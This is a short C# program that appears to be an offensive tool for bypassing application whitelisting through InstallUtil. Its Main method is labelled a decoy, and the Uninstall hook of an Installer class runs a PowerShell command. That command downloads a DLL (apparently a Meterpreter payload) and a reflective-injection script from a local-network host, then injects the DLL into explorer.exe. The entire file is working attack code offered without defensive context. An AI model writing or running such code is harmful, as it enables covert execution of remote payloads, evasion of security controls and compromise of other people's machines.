using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace install_util_reflective_injection
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$bytes=(new-object system.net.webclient).downloaddata('http://192.168.0.218/met.dll');$procid = (Get-Process -Name explorer).Id;iex((new-object net.webclient).downloadstring('http://192.168.0.218/Invoke-ReflectivePEInjection.ps1'));Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid;";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
